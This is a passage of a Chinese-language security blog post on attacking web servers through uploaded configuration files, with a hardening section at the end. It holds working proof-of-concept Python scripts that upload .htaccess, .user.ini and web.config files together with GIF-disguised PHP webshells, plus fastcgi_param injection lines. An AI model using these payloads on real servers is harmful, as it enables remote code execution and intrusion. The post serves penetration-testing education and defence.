+<h3 id="4-2-include-指令滥用"><a href="#4-2-include-指令滥用" class="headerlink" title="4.2 include 指令滥用"></a>4.2 include 指令滥用</h3><p>若主配置使用 <code>include</code> 引入上传目录下的文件：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include</span> /var/www/html/upload/<span class="regexp">*.conf</span>;  <span class="comment"># 危险配置</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者上传 <code>shell.conf</code> 即可注入任意 Nginx 指令。</p>
+<h3 id="4-3-Nginx-PHP-FPM-联动"><a href="#4-3-Nginx-PHP-FPM-联动" class="headerlink" title="4.3 Nginx + PHP-FPM 联动"></a>4.3 Nginx + PHP-FPM 联动</h3><p>在 Nginx + PHP-FPM 架构下，<code>.user.ini</code> 是主要攻击向量。此外若可修改 Nginx 配置，可通过 <code>fastcgi_param</code> 注入：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span> PHP_VALUE <span class="string">&quot;auto_prepend_file=/tmp/shell.txt&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-配置文件泄露"><a href="#4-4-配置文件泄露" class="headerlink" title="4.4 配置文件泄露"></a>4.4 配置文件泄露</h3><p>通过路径穿越或文件读取漏洞获取 <code>/etc/nginx/nginx.conf</code>、<code>/etc/nginx/sites-enabled/default</code>，提取上游地址、内部接口等信息扩大攻击面。</p>
+<h2 id="五、PHP-FPM-配置覆盖"><a href="#五、PHP-FPM-配置覆盖" class="headerlink" title="五、PHP-FPM 配置覆盖"></a>五、PHP-FPM 配置覆盖</h2><h3 id="5-1-动态-php-ini-注入"><a href="#5-1-动态-php-ini-注入" class="headerlink" title="5.1 动态 php.ini 注入"></a>5.1 动态 php.ini 注入</h3><p>FastCGI 协议中的 <code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code> 参数允许动态覆盖 PHP 配置。若攻击者能控制 <code>fastcgi_param</code>（例如通过 SSRF 打 PHP-FPM 监听端口）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span> PHP_VALUE <span class="string">&quot;auto_prepend_file=/tmp/shell.txt&quot;</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span> PHP_ADMIN_VALUE <span class="string">&quot;allow_url_include=On&quot;</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span> PHP_VALUE <span class="string">&quot;disable_functions=&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-PHP-FPM-端口暴露-SSRF"><a href="#5-2-PHP-FPM-端口暴露-SSRF" class="headerlink" title="5.2 PHP-FPM 端口暴露 + SSRF"></a>5.2 PHP-FPM 端口暴露 + SSRF</h3><p>部分运维将 PHP-FPM 监听 <code>0.0.0.0:9000</code>。若无防火墙限制，攻击者可通过 SSRF + Gopher 协议直接与 PHP-FPM 通信，发送构造的 FastCGI 包实现任意代码执行（常用 <code>gopherus</code> 生成 payload）。</p>
+<h2 id="六、竞态条件攻击"><a href="#六、竞态条件攻击" class="headerlink" title="六、竞态条件攻击"></a>六、竞态条件攻击</h2><p>配置文件攻击中存在多个可利用的时间窗口：</p>
+<ul>
+<li><code>.user.ini</code> 的 <code>user_ini.cache_ttl</code> 默认 300 秒，上传后缓存期内配置不生效，攻击者可在此期间替换已上传的图片马内容，或通过高频并发请求 “撞” 上缓存刷新窗口</li>
+<li>上传接口 “先写临时文件再重命名” 的机制：若可猜测 <code>/tmp/phpXXXXXX</code> 路径，可在文件被删除前通过 LFI 包含</li>
+<li>多线程模型：一个线程持续上传 <code>.user.ini</code> 争取最快生效，另一个高频访问目标 PHP 等待触发</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 竞态利用思路（伪代码）</span></span><br><span class="line">thread_1: 持续上传 .user.ini       <span class="comment"># 最短时间内让配置生效</span></span><br><span class="line">thread_2: 高频访问目标目录 PHP 文件  <span class="comment"># 等待 auto_prepend_file 触发</span></span><br><span class="line">thread_3: 在触发的瞬间执行后续 payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、实战-PoC-示例"><a href="#七、实战-PoC-示例" class="headerlink" title="七、实战 PoC 示例"></a>七、实战 PoC 示例</h2><h3 id="7-1-htaccess-图片马组合"><a href="#7-1-htaccess-图片马组合" class="headerlink" title="7.1 .htaccess + 图片马组合"></a>7.1 .htaccess + 图片马组合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://target.com/upload.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传 .htaccess（伪装为 GIF）</span></span><br><span class="line">htaccess = <span class="string">b&quot;# GIF89a\nAddType application/x-httpd-php .pwn\n&quot;</span></span><br><span class="line">requests.post(URL, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;.htaccess&quot;</span>, htaccess, <span class="string">&quot;application/octet-stream&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传图片马</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a\n&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;\n&quot;</span></span><br><span class="line">requests.post(URL, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.pwn&quot;</span>, shell, <span class="string">&quot;image/gif&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发</span></span><br><span class="line">r = requests.get(<span class="string">&quot;http://target.com/uploads/shell.pwn&quot;</span>, params=&#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;id&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-user-ini-图片马组合"><a href="#7-2-user-ini-图片马组合" class="headerlink" title="7.2 .user.ini + 图片马组合"></a>7.2 .user.ini + 图片马组合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://target.com/upload.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: .user.ini</span></span><br><span class="line">requests.post(URL, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;.user.ini&quot;</span>, <span class="string">b&quot;auto_prepend_file=shell.gif\n&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 图片马</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&quot;</span></span><br><span class="line">requests.post(URL, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.gif&quot;</span>, shell, <span class="string">&quot;image/gif&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 等待 cache_ttl 过期后访问该目录任意 .php，用蚁剑/冰蝎连接</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-web-config-上传"><a href="#7-3-web-config-上传" class="headerlink" title="7.3 web.config 上传"></a>7.3 web.config 上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">webconfig = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;configuration&gt;&lt;system.webServer&gt;&lt;handlers&gt;</span></span><br><span class="line"><span class="string">&lt;add name=&quot;pwn&quot; path=&quot;*.jpg&quot; verb=&quot;*&quot; modules=&quot;FastCgiModule&quot;</span></span><br><span class="line"><span class="string">    scriptProcessor=&quot;C:\\php\\php-cgi.exe&quot; resourceType=&quot;Unspecified&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/handlers&gt;&lt;/system.webServer&gt;&lt;/configuration&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.post(<span class="string">&quot;http://target.com/upload.aspx&quot;</span>,</span><br><span class="line">              files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;web.config&quot;</span>, webconfig, <span class="string">&quot;text/xml&quot;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="八、防御方案"><a href="#八、防御方案" class="headerlink" title="八、防御方案"></a>八、防御方案</h2><h3 id="8-1-文件上传控制"><a href="#8-1-文件上传控制" class="headerlink" title="8.1 文件上传控制"></a>8.1 文件上传控制</h3><ul>
+<li><strong>白名单后缀</strong>：仅允许 <code>.jpg</code>、<code>.png</code>、<code>.pdf</code> 等业务所需后缀，拒绝一切配置相关后缀</li>
+<li><strong>过滤关键文件名</strong>：<code>.htaccess</code>、<code>.user.ini</code>、<code>web.config</code>、<code>*.conf</code> 等（含大小写变体与 NTFS 流后缀）</li>
+<li><strong>内容类型检测</strong>：对文件的<strong>真实 MIME 类型</strong>（magic bytes）进行校验，不信任客户端 <code>Content-Type</code></li>
+<li><strong>强制随机重命名</strong>：使用 UUID &#x2F; 时间戳命名，避免保留原始文件名</li>
+</ul>
+<h3 id="8-2-服务器加固"><a href="#8-2-服务器加固" class="headerlink" title="8.2 服务器加固"></a>8.2 服务器加固</h3><p><strong>Apache：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /var/www/html/uploads&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None            # 禁用 .htaccess 覆盖</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;^\.ht&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied            # 禁止访问隐藏配置文件</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ /\.</span> &#123; <span class="attribute">deny</span> all; <span class="attribute">return</span> <span class="number">403</span>; &#125;    <span class="comment"># 禁止访问隐藏文件</span></span><br><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123; <span class="attribute">deny</span> all; &#125;         <span class="comment"># 上传目录禁止 PHP 执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>IIS：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security</span>&gt;</span><span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hiddenSegments</span>&gt;</span><span class="tag">&lt;<span class="name">add</span> <span class="attr">segment</span>=<span class="string">&quot;web.config&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">hiddenSegments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span><span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP-FPM：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 禁用 .user.ini 解析（视业务需要）</span></span><br><span class="line"><span class="attr">user_ini.filename</span> =</span><br><span class="line"><span class="attr">open_basedir</span> = /var/www/html</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-纵深防御"><a href="#8-3-纵深防御" class="headerlink" title="8.3 纵深防御"></a>8.3 纵深防御</h3><ul>
+<li><strong>最小权限</strong>：Web 应用对上传目录仅授予<strong>写入权限</strong>，不给执行权限</li>
+<li><strong>目录隔离</strong>：将上传文件存储在 Web 根目录之外，通过独立脚本读取输出</li>
+<li><strong>对象存储分离</strong>：使用 OSS &#x2F; S3 等独立服务，避免文件直接落在应用服务器磁盘</li>
+<li><strong>WAF 规则</strong>：配置检测配置文件上传的规则（文件名关键词 + 内容特征）</li>
+<li><strong>定期审计</strong>：扫描上传目录是否存在 <code>.htaccess</code>、<code>.user.ini</code> 等异常文件</li>
+</ul>
+<h3 id="8-4-监控告警"><a href="#8-4-监控告警" class="headerlink" title="8.4 监控告警"></a>8.4 监控告警</h3><ul>
+<li>记录所有文件上传操作，特别是以 <code>.</code> 开头的隐藏文件</li>
+<li>监控上传目录中非预期文件后缀的出现</li>
+<li>对短时间内高频访问同一 PHP 文件的行为告警</li>
+<li>审计 PHP-FPM 错误日志中异常的 <code>auto_prepend_file</code> 变更</li>
+</ul>
+<h2 id="九、常见误区"><a href="#九、常见误区" class="headerlink" title="九、常见误区"></a>九、常见误区</h2><table>
+<thead>
+<tr>
+<th>误区</th>
+<th>真相</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Content-Type</code> 头不可信</td>
+<td>由客户端发送，可任意伪造</td>
+</tr>
+<tr>
+<td>黑名单后缀过滤足够</td>
+<td>大小写、双后缀、NTFS 流等多手段可绕过</td>
+</tr>
+<tr>
+<td>上传目录无 .php 所以安全</td>
+<td><code>.user.ini</code> 使图片马在访问其他 PHP 时执行</td>
+</tr>
+<tr>
+<td>Nginx 没有配置攻击面</td>
+<td>仍受 <code>.user.ini</code> 影响，且 <code>include</code> 配置不当可被利用</td>
+</tr>
+<tr>
+<td>CDN &#x2F; WAF 能完全防御</td>
+<td>高级混淆和分段上传可绕过基于签名的检测</td>
+</tr>
+<tr>
+<td>只禁 <code>.htaccess</code> 就够了</td>
+<td><code>.htpasswd</code>、<code>.htgroup</code>、<code>.user.ini</code> 等其他隐藏文件同样危险</td>
+</tr>
+</tbody></table>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>配置文件攻击是文件上传漏洞利用链中的高级技巧，往往不被常规安全测试覆盖，因此成为实战渗透中的关键手段。理解各类 Web 服务器的配置机制不仅有助于发现漏洞，更能指导团队从架构层面做好防御。</p>
+<p>安全从业者应在授权的渗透测试中充分验证此类攻击面，推动配置文件防护纳入安全基线检查项，构建纵深防御体系。</p>
+<hr>
+<p><strong>免责声明：</strong> 本文仅供安全研究与学习目的，文中涉及的技术与代码示例不得用于任何未经授权的网络攻击行为。使用者须遵守当地法律法规，在获得明确授权的环境中进行安全测试。对于滥用本文内容造成的任何后果，作者不承担任何责任。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Post-exploit-exfiltration/" rel="prev" title="后渗透：数据窃取与外传">
+                  <i class="fa fa-angle-left"></i> 后渗透：数据窃取与外传
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-SMB-attacks/" rel="next" title="SMB协议攻击">
+                  SMB协议攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
